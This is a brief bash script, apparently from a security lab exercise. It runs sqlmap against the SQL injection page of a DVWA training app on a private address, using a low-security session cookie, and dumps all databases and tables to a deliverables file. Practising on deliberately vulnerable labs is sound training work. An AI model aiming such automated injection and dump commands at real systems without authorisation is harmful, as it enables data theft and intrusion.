bash
#!/bin/bash
# Run: chmod +x sqlmap_dvwa.sh; ./sqlmap_dvwa.sh
sqlmap -u "http://192.168.1.200/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123; security=low" --dbs --tables --dump \
  -o deliverables/sqlmap_output.txt
echo "Dump in deliverables/sqlmap_output.txt"
